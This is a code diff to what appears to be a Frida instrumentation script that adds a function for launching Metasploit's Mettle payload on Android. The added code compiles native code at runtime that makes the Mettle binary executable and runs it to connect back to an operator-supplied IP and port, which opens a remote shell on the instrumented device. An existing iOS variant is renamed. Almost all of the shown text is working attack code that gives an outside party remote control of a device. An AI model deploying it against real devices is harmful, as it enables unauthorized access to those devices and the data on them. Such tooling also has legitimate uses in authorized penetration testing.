@@ -9,7 +9,7 @@ rpc.exports = {
       Module.load(p + '/' + dlib);
     });
   },
-  connectMettle: function(dlib, ip, port) {
+  connectMettleIOs: function(dlib, ip, port) {
     var source = "#include <glib.h>" +
     "char **getargs() {" +
     "    char **argv = g_malloc(3 * sizeof(char*));" +
@@ -36,5 +36,25 @@ rpc.exports = {
       console.log('Calling mettleMain()');
       mettleMain(3, argv());
     });
+  },
+  connectMettleAndroid: function(mettle_droid_path,ip, port) {
+		var code = "#include <stdio.h>\n";
+		code+="#include <stdlib.h>\n";
+		code+="#include <gum/guminterceptor.h>\n";
+		code+="extern int system (const char * m);\n";
+		code+="extern int strlen (const char * m);\n";
+		code+="#include <stdio.h>\n";
+		code+="int main(int a, int b) { \n";
+		code+="system(\"/system/bin/chmod +x "+mettle_droid_path+"\");\n";
+		code+="int u = system (\""+mettle_droid_path+" -b 1 -u tcp://{ip}:{port}\");\n"
+		code+="return u;\n";
+		code+="}\n";
+		// update with the target ip:port;
+		code = code.replace("{ip}", ip);
+    		code = code.replace("{port}", port);
+		const cm = new CModule(code);
+		var mettle_droid = new NativeFunction(cm.main,'int',[]);
+		mettle_droid();
+		console.log("Mettle successfully connected! check your listener.");
   }
 }
